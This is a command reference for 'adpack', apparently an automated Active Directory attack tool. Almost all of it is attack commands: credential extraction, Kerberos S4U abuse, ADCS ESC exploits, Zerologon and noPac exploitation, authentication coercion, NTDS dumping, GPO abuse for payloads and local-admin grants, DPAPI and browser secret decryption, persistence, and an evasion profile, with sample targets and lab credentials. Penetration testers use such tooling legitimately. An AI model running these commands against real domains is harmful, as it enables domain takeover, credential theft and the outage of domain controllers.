# AdPack Usage Guide

Complete command reference for adpack v0.4.0.

## Quick Start

```bash
adpack status                          # View current state and gaps
adpack next                            # Show recommended next phase
adpack run discovery -t 10.0.0.5       # Find domain controllers
adpack run enumeration -t 10.0.0.5     # Enumerate users and computers
adpack run credential_acq -t 10.0.0.5  # Extract credentials
adpack validate                        # Test creds across protocols
adpack run lateral -t 10.0.0.6         # Lateral movement
```

## Automated Attack Chain

```bash
adpack autorun --target 192.168.57.22 \
  --domain north.sevenkingdoms.local \
  --user samwell.tarly --password Heartsbane \
  --execute --skip-fail
```

Flags:
- `--target` — Target IP or hostname
- `--domain` — Domain name
- `--user` — Username for initial authentication
- `--password` — Password for initial authentication
- `--execute` — Actually execute phases (omit for dry-run)
- `--skip-fail` — Continue past failed phases
- `--resume` — Resume from last completed phase
- `--dry-run` — Preview without executing
- `--provider-log <file>` — Write provider events as JSONL

## Phase Execution

```bash
adpack run <phase> [flags]
```

Phases: `discovery`, `enumeration`, `credential_acq`, `session_harvest`, `graph_analysis`, `lateral`, `validation`, `privesc`, `persistence`

Flags:
- `-t, --target` — Target IP or hostname
- `-e, --evasion` — Evasion profile (standard, bypass, custom)
- `--resume` — Resume partially-completed phase
- `--dry-run` — Preview without executing
- `--provider-log <file>` — Write provider events as JSONL

## State Management

### Status & Navigation
```bash
adpack status              # Full state overview with gaps
adpack next                # Recommended next phase
adpack phases              # Table of all phases with status
adpack loot                # Comprehensive loot summary
adpack reset               # Reset all state (requires confirmation)
```

### Session Management
```bash
adpack session save <name>           # Save current state
adpack session load <name>           # Load saved state
adpack session list                  # List all saved sessions
adpack session delete <name>         # Delete a session
adpack session export <name> [-o]    # Export to portable JSON
adpack session import <name> <file>  # Import from JSON envelope
```

## Credential Operations

```bash
adpack cred list [--format json|csv] [--show-secrets]
adpack cred export [--output <file>] [--show-secrets]
adpack cred status
adpack cred verify [username] [-t <target>]
```

- `--show-secrets` — Include plaintext secrets in output
- `--format` — Output format (json, csv, or table default)
- `verify` — Tests unvalidated creds against target via SMB

## Kerberos Operations

```bash
adpack kerb tgt <user> <password> <domain> <dc-ip>     # Request TGT
adpack kerb list                                         # List cached tickets
adpack kerb destroy                                      # Destroy all tickets
adpack kerb s4u <user> <domain> <dc-ip> <target>        # S4U2self + S4U2proxy
```

## ADCS Exploitation

```bash
adpack adcs find --dc-ip <ip> [--user <u> --password <p> --domain <d>]
adpack adcs esc1 --dc-ip <ip> --template <t> --upn <u> --ca <ca>
adpack adcs esc3 --dc-ip <ip> --template <t> --upn <u> --ca <ca>
adpack adcs esc4 --dc-ip <ip> --template <t>
adpack adcs esc6 --dc-ip <ip> --template <t> --ca <ca>
adpack adcs esc8 --dc-ip <ip> --listen <ip> --template <t>
adpack adcs esc9 --dc-ip <ip> --template <t> --target <u> --ca <ca>
adpack adcs esc10 --dc-ip <ip> --target <u> --ca <ca>
adpack adcs esc13 --dc-ip <ip> --template <t> --ca <ca>
adpack adcs auth --pfx <file> --dc-ip <ip>
```

ESC techniques require certipy (`pipx install certipy-ad`).

## Zerologon (CVE-2020-1472)

```bash
adpack zerologon check --dc-ip <ip>
adpack zerologon exploit --dc-ip <ip> --dc-name <name>
adpack zerologon dcsync --dc-ip <ip> --dc-name <name>
adpack zerologon restore --dc-ip <ip> --dc-name <name> --hash <nt_hash>
```

**WARNING**: The exploit resets the DC machine account password. The DC will be non-functional until restored. Always save the original hash first.

## noPac (CVE-2021-42278/42287)

```bash
adpack nopac check --dc-ip <ip> [--domain <d> --user <u> --password <p>]
adpack nopac exploit --dc-ip <ip> --domain <d> --user <u> --password <p> [--target-user <u>]
adpack nopac dcsync --dc-ip <ip> --domain <d> [--dc-hostname <h>]
adpack nopac scan --target <cidr>
```

## Coercion Attacks

```bash
adpack coerce printerbug --target <ip> --listen <ip>
adpack coerce petitpotam --target <ip> --listen <ip>
adpack coerce dfscoerce --target <ip> --listen <ip>
adpack coerce shadow --target <ip> --listen <ip>
adpack coerce all --target <ip> --listen <ip>
```

All coercion methods require a relay listener running on the listen IP.

## Domain Trust Attacks

```bash
adpack trust list --dc-ip <ip> --user <u> --password <p> --domain <d>
adpack trust keys --dc-ip <ip> --user <u> --password <p> --domain <d>
adpack trust inter-realm --target-domain <d> --dc-ip <ip> --trust-key <k>
adpack trust sidhistory --target-domain <d> --dc-ip <ip> --domain <d>
```

## Shadow Copy NTDS Extraction

```bash
adpack shadow ntds --target <ip> --user <u> --password <p> --domain <d>
adpack shadow ifm --target <ip> --user <u> --password <p> --domain <d>
adpack shadow parse --ntds <file> --system <file>
```

## GPO Abuse

```bash
adpack gpo create --name <n> --ou <ou> --target <ip>
adpack gpo runkey --name <n> --cmd <c> --target <ip>
adpack gpo task --name <n> --payload <p> --target <ip>
adpack gpo localadmin --name <n> --target-user <u> --target <ip>
adpack gpo find --target <ip>
```

## DPAPI Operations

```bash
adpack dpapi backupkey --dc-ip <ip> [--user <u> --password <p> --domain <d>]
adpack dpapi masterkey --file <f> --pvk <pvk>
adpack dpapi blob --file <f> --key <k>
adpack dpapi vault --file <f> --key <k>
adpack dpapi chrome --state <f> --key <k>
adpack dpapi triage --dc-ip <ip> --user <u> --password <p> --domain <d>
adpack dpapi credentials --dc-ip <ip> --user <u> --password <p> --domain <d>
```

## gMSA & LAPS

```bash
adpack gmsa list --dc-ip <ip> --domain <d> --user <u> --password <p>
adpack gmsa read --dc-ip <ip> --domain <d> --user <u> --password <p> --name <n>
adpack laps list --dc-ip <ip> --domain <d> --user <u> --password <p>
```

## Reporting

```bash
adpack report html --output report.html
adpack report md --output report.md
adpack report json --output report.json
```

## Validation Suite

```bash
adpack validate [-t <target>]    # Validate credentials against hosts
adpack validate tools             # Check all tool dependencies
adpack validate config            # Validate config file
adpack validate setup             # Full setup validation (tools + config)
```

## BloodHound Integration

```bash
adpack bloodhound collect --dc-ip <ip> --user <u> --password <p> --domain <d>
adpack ingest <file>              # Import BloodHound JSON
adpack query <cypher>             # Run Cypher query against Neo4j
```

## Utility Commands

```bash
adpack interactive     # Launch TUI dashboard
adpack profiles        # List evasion profiles
adpack completion <shell>  # Generate shell completion (bash|zsh|fish|powershell)
adpack version [--json]    # Print version
```

## Global Flags

| Flag | Description |
|------|-------------|
| `-c, --config` | Config file path (default: `~/.adpack/config.yaml`) |
| `-d, --db` | Database path (default: `~/.adpack/state.db`) |
| `--hashcat-path` | Path to hashcat binary |
| `--wordlist` | Path to wordlist |
| `--rules` | Comma-separated hashcat rule files |
| `--crack-timeout` | Timeout in seconds per hash |

## Environment Variables

| Variable | Description |
|----------|-------------|
| `ADPACK_PROXY` | SOCKS5 proxy address for transport routing |
| `GO_VERSION` | Go version for setup.sh (default: 1.25.10) |
| `KRB5CCNAME` | Kerberos credential cache path |

## Workflow Examples

### Full Engagement
```bash
# 1. Seed initial credentials
adpack autorun --target 10.0.0.10 --domain corp.local \
  --user jsmith --password Spring2024 --execute --skip-fail

# 2. Review state
adpack status
adpack loot

# 3. Save session
adpack session save corp_engagement_01

# 4. Generate report
adpack report html --output corp_report.html
```

### Manual Step-by-Step
```bash
adpack run discovery -t 10.0.0.0/24
adpack run enumeration -t 10.0.0.10
adpack run credential_acq -e bypass -t 10.0.0.10
adpack validate
adpack run session_harvest -t 10.0.0.10
adpack run graph_analysis -t 10.0.0.10
adpack run lateral -t 10.0.0.11
adpack run privesc -t 10.0.0.10
adpack run persistence -t 10.0.0.10
```

### Targeted Exploit Chain
```bash
# Check for Zerologon
adpack zerologon check --dc-ip 10.0.0.10

# Save original hash before exploit
adpack zerologon exploit --dc-ip 10.0.0.10 --dc-name DC01
adpack zerologon dcsync --dc-ip 10.0.0.10 --dc-name DC01
adpack zerologon restore --dc-ip 10.0.0.10 --dc-name DC01 --hash <hash>
```

### ADCS Attack Path
```bash
adpack adcs find --dc-ip 10.0.0.10 -u jsmith -p pass -d corp.local
adpack adcs esc1 --dc-ip 10.0.0.10 --template CorpWebServer \
  --upn Administrator@corp.local --ca CORP-DC01-CA
```
